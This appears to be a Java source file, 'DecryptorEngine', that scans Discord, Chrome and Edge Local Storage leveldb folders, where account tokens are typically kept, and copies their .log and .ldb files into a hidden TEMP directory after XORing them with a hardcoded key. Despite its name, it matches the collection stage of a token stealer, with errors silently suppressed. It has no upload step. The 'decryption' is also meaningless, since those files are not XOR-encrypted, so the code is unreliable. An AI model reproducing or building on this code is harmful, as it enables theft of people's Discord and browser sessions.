import java.io.*;
import java.nio.file.*;

public class DecryptorEngine {
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final byte[] KEY = "SwillWay2025Key42".getBytes();
    
    public static void main(String[] args) {
        new File(TEMP_DIR).mkdirs();
        scanAndDecrypt();
    }
    
    private static void scanAndDecrypt() {
        String[] targetPaths = {
            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb"
        };
        
        for (String path : targetPaths) {
            File dir = new File(path);
            if (dir.exists() && dir.isDirectory()) {
                decryptLevelDB(dir);
            }
        }
    }
    
    private static void decryptLevelDB(File leveldbDir) {
        File[] files = leveldbDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null) return;
        for (File f : files) {
            try {
                byte[] encrypted = Files.readAllBytes(f.toPath());
                byte[] decrypted = xorDecrypt(encrypted);
                String outPath = TEMP_DIR + "\\" + f.getName() + ".dec";
                Files.write(Paths.get(outPath), decrypted);
            } catch (Exception e) {}
        }
    }
    
    private static byte[] xorDecrypt(byte[] data) {
        byte[] result = new byte[data.length];
        for (int i = 0; i < data.length; i++) {
            result[i] = (byte) (data[i] ^ KEY[i % KEY.length]);
        }
        return result;
    }
}
